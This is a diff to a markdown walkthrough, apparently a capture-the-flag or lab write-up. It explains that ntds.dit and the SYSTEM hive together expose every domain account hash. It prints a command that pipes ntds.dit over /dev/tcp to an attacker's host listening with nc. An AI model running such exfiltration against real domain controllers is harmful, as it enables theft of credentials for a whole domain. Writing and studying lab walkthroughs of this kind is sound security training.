@@ -451,11 +451,11 @@ root@DC:.../Backups# cd registry; ls
 SECURITY  SYSTEM
 ```
 
-`ntds.dit` is the database file that backs the entire domain — every user and computer account hash lives in it. Combined with the `SYSTEM` registry hive (needed to derive the boot key that decrypts it), this is equivalent to full domain compromise.
+`ntds.dit` is the database file that backs the entire domain: every user and computer account hash lives in it. Combined with the `SYSTEM` registry hive (needed to derive the boot key that decrypts it), this is equivalent to full domain compromise.
 
 ### Exploitation
 
-The two files are exfiltrated over a raw TCP connection, caught with `nc`:
+The two files are sent to the kali host over a raw TCP connection, caught with `nc`:
 
 ```
 root@DC:/tmp# cat /tmp/ntds.dit > /dev/tcp/10.10.15.74/9001
